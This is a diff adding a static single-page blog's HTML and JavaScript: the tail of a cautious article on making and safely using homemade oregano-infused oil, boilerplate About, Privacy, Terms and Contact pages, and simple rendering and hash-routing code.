+<p>Oregano has long been connected with digestion because it is a culinary herb used in Mediterranean-inspired dishes, soups, sauces, roasted vegetables, and savory meals. As a food herb, oregano can be a flavorful way to support digestion naturally.</p>
+
+<p>Oregano oil, however, is much stronger than dried oregano sprinkled on food. People sometimes use diluted oregano oil preparations for digestive support, but internal use should be approached cautiously and only with appropriate guidance. Concentrated oils can be harsh on the digestive system.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Make Oregano Oil at Home</h2>
+
+<p>Homemade oregano oil usually means oregano-infused oil, not essential oil. Making true essential oil requires specialized distillation equipment and a large amount of plant material. A home infusion is much simpler and more practical for most people.</p>
+
+<p>The basic idea is to steep oregano in a carrier oil for several weeks, allowing the herb’s aroma and plant compounds to infuse into the oil. After steeping, the oil is strained and stored in a clean bottle or dropper bottle.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Ingredients You Need</h3>
+
+<ul>
+  <li>Fresh or dried oregano leaves</li>
+  <li>A carrier oil such as olive oil, avocado oil, jojoba oil, or sweet almond oil</li>
+  <li>A clean, dry glass jar with a lid</li>
+  <li>A fine mesh strainer or cheesecloth</li>
+  <li>A clean dropper bottle or storage bottle</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step-by-Step Method</h3>
+
+<ol>
+  <li><strong>Prepare the oregano:</strong> If using fresh oregano, wash it gently and let it dry completely. Moisture can increase the risk of spoilage. Dried oregano is often easier and safer for infusions.</li>
+  <li><strong>Fill the jar:</strong> Place oregano in a clean glass jar. Do not pack it too tightly.</li>
+  <li><strong>Add carrier oil:</strong> Pour oil over the oregano until the leaves are fully covered.</li>
+  <li><strong>Seal and steep:</strong> Close the jar and place it in a cool, dark place for 4 to 8 weeks. Shake the jar occasionally.</li>
+  <li><strong>Strain the oil:</strong> Pour the oil through cheesecloth or a fine strainer to remove plant material.</li>
+  <li><strong>Store properly:</strong> Transfer the strained oil to a clean bottle, label it with the date, and store it away from heat and sunlight.</li>
+</ol>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Dried oregano is often the better choice for homemade infused oil because it contains less moisture than fresh oregano. Less moisture means a lower chance of spoilage during the steeping process.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How Long Should Oregano Oil Steep?</h2>
+
+<p>A typical homemade oregano oil infusion steeps for 4 to 8 weeks. The longer steeping time allows the carrier oil to take on more of the herb’s aroma and character. During this time, shaking the jar occasionally helps redistribute the oregano and oil.</p>
+
+<p>Keep the jar in a cool, dark place. Avoid leaving it in direct sunlight for long periods, since heat and light can affect oil quality. Once strained, store the finished oil in a clean bottle and use it within a reasonable timeframe.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Signs Your Oil Should Be Discarded</h3>
+
+<ul>
+  <li>It smells rancid, sour, or unpleasant</li>
+  <li>It becomes cloudy in an unusual way</li>
+  <li>You see mold or bubbling</li>
+  <li>The lid pops or pressure builds in the jar</li>
+  <li>The color, smell, or texture changes dramatically</li>
+</ul>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Note</h3>
+  <p style="margin:0;color:#334155;">Homemade herbal oils are only as good as their preparation. Use clean, dry equipment, keep water out of the jar, label the date clearly, and discard any oil that looks or smells questionable.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Use Oregano Oil Safely</h2>
+
+<p>Oregano oil has a reputation for strength, so safe use matters. The most important rule is dilution. Whether you are using oregano essential oil or a homemade infused oil, it is wise to start small and pay attention to how your body responds.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Topical Use</h3>
+
+<p>For skin use, oregano essential oil should be diluted in a carrier oil before application. Carrier oils include olive oil, coconut oil, jojoba oil, almond oil, and avocado oil. Homemade oregano-infused oil is already diluted by nature of the infusion, but it is still smart to patch test before wider use.</p>
+
+<p>Apply a small amount to the inner forearm and wait 24 hours. If redness, burning, itching, or irritation develops, do not use it on larger areas.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Aromatic Use</h3>
+
+<p>Some people use oregano essential oil in a diffuser for a strong herbal aroma. Because it is intense, it should be used sparingly and in a well-ventilated space. It may not be suitable around babies, young children, pets, people with asthma, or anyone sensitive to strong scents.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Internal Use</h3>
+
+<p>The image suggests diluting 1 to 3 drops in water or a carrier oil. This type of use should be approached with caution. Oregano essential oil can irritate mucous membranes and the digestive tract, and not all oils are labeled or formulated for internal use.</p>
+
+<p>For most people, using oregano as a food herb is the safest internal approach. If considering oregano oil by mouth, speak with a qualified healthcare professional first, especially if you take medication or have a health condition.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Never assume that an essential oil is safe to drink just because it is natural. Concentrated oils can be powerful and irritating. Always follow product directions and seek professional guidance for internal use.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Oregano Oil vs. Oregano in Food</h2>
+
+<p>One of the easiest ways to enjoy oregano is simply to cook with it. Dried oregano, fresh oregano, and oregano-rich foods are much gentler than concentrated oil. Adding oregano to meals can support a flavorful, herb-forward diet without the same safety concerns as essential oil use.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Easy Ways to Use Oregano in Meals</h3>
+
+<ul>
+  <li>Sprinkle dried oregano into soups and stews</li>
+  <li>Add fresh oregano to salads, roasted vegetables, and grain bowls</li>
+  <li>Mix oregano into olive oil with garlic and lemon</li>
+  <li>Use oregano in marinades for chicken, fish, or vegetables</li>
+  <li>Add it to tomato sauces, pizza, pasta, and bean dishes</li>
+</ul>
+
+<p>If your goal is general wellness, the food-first approach is often the most sustainable. It supports healthy eating habits while letting you enjoy oregano’s flavor in a normal, everyday way.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Who Should Be Careful With Oregano Oil?</h2>
+
+<p>Oregano oil is not appropriate for everyone. Because it is strong, it may interact with certain conditions, medications, or life stages. Some people should avoid it unless a healthcare professional says otherwise.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Use Extra Caution If You Are:</h4>
+
+<ul>
+  <li>Pregnant or trying to become pregnant</li>
+  <li>Breastfeeding</li>
+  <li>Giving remedies to children</li>
+  <li>Taking blood thinners or medication for blood sugar</li>
+  <li>Managing liver, kidney, digestive, or immune conditions</li>
+  <li>Allergic to herbs in the mint family</li>
+  <li>Preparing for surgery</li>
+</ul>
+
+<p>People with sensitive skin should be especially careful with topical use. Oregano oil can feel hot or irritating if it is not diluted enough. When in doubt, skip it or ask a professional.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Smart Storage Tips for Homemade Oregano Oil</h2>
+
+<p>Proper storage helps preserve quality and reduce waste. Homemade oregano oil should be kept in a clean glass bottle, ideally amber or dark-colored, and stored away from heat, sunlight, and moisture.</p>
+
+<p>Label the bottle with the ingredients and preparation date. This is especially helpful if you make multiple herbal oils at home. A simple label can prevent confusion later.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Best Storage Practices</h3>
+
+<ul>
+  <li>Use dry herbs and clean jars</li>
+  <li>Strain out all plant material before bottling</li>
+  <li>Store in a cool, dark place</li>
+  <li>Keep the cap tightly closed</li>
+  <li>Use clean hands or droppers when handling</li>
+  <li>Discard if the smell, color, or texture seems off</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Make small batches of homemade oregano oil instead of large jars. Smaller batches are easier to use while fresh and reduce the chance of keeping an old oil too long.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Common Mistakes to Avoid</h2>
+
+<p>Oregano oil is simple in concept, but mistakes can happen. Avoiding a few common errors can make your experience safer and more effective.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Using Too Much</h3>
+
+<p>More oregano oil does not mean better results. Overuse can cause irritation or discomfort. Start with very small amounts and use it only when appropriate.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Skipping Dilution</h3>
+
+<p>This is one of the biggest safety mistakes. Oregano essential oil is too strong to apply directly to the skin. Always dilute it in a carrier oil and patch test first.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Using Wet Herbs in an Oil Infusion</h3>
+
+<p>Fresh herbs must be completely dry before being covered in oil. Water trapped in the jar can encourage spoilage. Dried oregano is often the easiest option for beginners.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Treating It Like a Cure-All</h3>
+
+<p>Oregano oil can be part of a wellness toolkit, but it is not a cure for infections, chronic conditions, or serious symptoms. If you are sick, in pain, or unsure what is happening, seek medical guidance.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li><strong>Best beginner option:</strong> Make a mild oregano-infused oil with dried oregano and olive oil.</li>
+    <li><strong>Most important rule:</strong> Dilute oregano essential oil before topical use.</li>
+    <li><strong>Steeping time:</strong> Homemade oregano-infused oil commonly steeps for 4 to 8 weeks.</li>
+    <li><strong>Safest everyday use:</strong> Add oregano to meals as a flavorful culinary herb.</li>
+    <li><strong>When to ask a professional:</strong> Before internal use, during pregnancy or nursing, or when taking medication.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: A Powerful Herbal Remedy That Deserves Respect</h2>
+
+<p>Oregano oil is popular for a reason. Its bold aroma, traditional reputation, and versatile uses make it a standout in the world of natural remedies. From homemade infused oils to carefully diluted topical blends, oregano can be a useful herb to understand and appreciate.</p>
+
+<p>The key is using it wisely. Oregano oil is powerful, so careful dilution, proper storage, realistic expectations, and safety awareness matter. Homemade oregano-infused oil can be a rewarding project, especially for anyone who enjoys herbal preparations, but it should be made with clean equipment and stored responsibly.</p>
+
+<p>For everyday wellness, do not underestimate the simplest option: cooking with oregano. A sprinkle in soup, a handful of fresh leaves in a salad, or an oregano-rich olive oil dressing can bring the herb into your routine in a gentle and delicious way.</p>
+
+<p>Natural remedies are most helpful when they are used with balance. Oregano oil can have a place in a thoughtful wellness cabinet, but it works best alongside good nutrition, rest, hydration, hygiene, and professional medical care when needed.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Oregano Oil</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Remedies</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Herbal Wellness</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">DIY Herbal Oil</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Immune Support</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Essential Oil Safety</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Home Remedies</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Oregano Benefits</span>
+</div>
+`
+            }
+        ];
+
+        // Static Legal Pages (Required for AdSense & Pinterest)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>My Awesome Blog</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about web development, creative hobbies, and daily life.</p>
+                    <p>Whether you are here to learn how to code, find creative inspiration, or just read some fun stories, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and learning.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At My Awesome Blog, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+                    
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+                    
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+                    
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@carolynadamsulo-creator.github.io">contact@carolynadamsulo-creator.github.io</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Logic
+        const app = document.getElementById('app');
+        const blogUsername = "Structured Success Edit";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // A placeholder avatar
+
+        // Function to render the home page (list of posts)
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render a static page (like Privacy Policy)
+        function renderPage(pageId) {
+            const page = pages[pageId];
+
+            if (!page) {
+                app.innerHTML = `<p style="color: white;">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 30px; padding-bottom: 30px;">
+                        <h1>${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Function to render a single post
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+
+            if (!post) {
+                app.innerHTML = `<p style="color: white;">Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Simple router/navigator
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Listen for browser back/forward buttons
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                // Check if the hash matches a static page, otherwise assume it's a post
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+
+</html>
